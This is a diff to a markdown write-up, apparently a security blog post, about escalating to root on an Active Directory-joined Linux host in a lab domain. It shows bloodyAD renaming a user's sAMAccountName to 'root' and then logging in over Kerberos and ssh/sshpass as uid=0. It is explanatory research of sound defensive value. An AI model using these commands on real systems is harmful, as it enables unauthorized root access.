@@ -83,7 +83,6 @@ mercury.local
 
 $ hostname -f
 L-MGRT-APP001.mercury.local
-
 ```
 
 This domain was joined using the [`realm` command, and authentication services are handled by `SSSD`.](https://www.redhat.com/en/blog/linux-active-directory), and `Domain Admins` is the only group permitted to log in to the system.
@@ -298,17 +297,17 @@ Similarly, if we have the ability to write to the `sAMAccountName` of a user; we
 ~$ bloodyAD --host 'C-DC01.mercury.local' -u 'gatari-ad' -p 'P@ssw0rd' set object 'gatari-ad' 'sAMAccountName' -v 'root'
 [+] gatari-ad's sAMAccountName has been updated
 
-echo 'P@ssw0rd' | kinit 'root' -E 
+~$ echo 'P@ssw0rd' | kinit 'root' -E 
 Password for root@MERCURY.LOCAL: 
 
-ssh 'root'@L-MGRT-APP001.mercury.local -K id   
+~$ ssh 'root'@L-MGRT-APP001.mercury.local -K id   
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
 In this case, we can also authenticate with password authentication, as the `sAMAccountName` is used to look up the user in Active Directory.
 
 ```
-sshpass -p 'P@ssw0rd' ssh 'root'@L-MGRT-APP001.mercury.local id             
+~$ sshpass -p 'P@ssw0rd' ssh 'root'@L-MGRT-APP001.mercury.local id             
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
